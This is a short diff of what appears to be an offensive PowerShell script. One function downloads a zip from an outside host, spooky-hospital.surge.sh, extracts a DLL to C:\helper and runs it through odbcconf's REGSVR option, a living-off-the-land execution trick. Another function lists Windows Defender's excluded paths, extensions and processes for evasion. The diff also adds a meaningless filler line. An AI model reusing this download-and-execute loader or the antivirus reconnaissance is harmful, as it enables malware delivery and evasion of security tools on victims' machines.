@@ -1,8 +1,8 @@
-function msf (){
+function msf2 (){
 wget 'spooky-hospital.surge.sh/msv2.zip' -o 'C:\helper\msv2.zip';expand-archive -Path 'C:\helper\msv2.zip' -Destination 'C:\helper\'
 if (Test-Path 'C:\helper\msv2.dll') {start-process odbcconf -Argument "REGSVR C:\helper\msv2.dll"} else { sleep 1}
 }
-
+xxxxxxxxxxxxxxxxx
 
 function av-excluded(){"Excluded paths:`n$((Get-MpPreference).ExclusionPath -join "`n")`nExcluded extensions: $((Get-MpPreference).ExclusionExtension -join ", ")`nExcluded processes: $((Get-MpPreference).ExclusionProcess -join ", ")"}
 
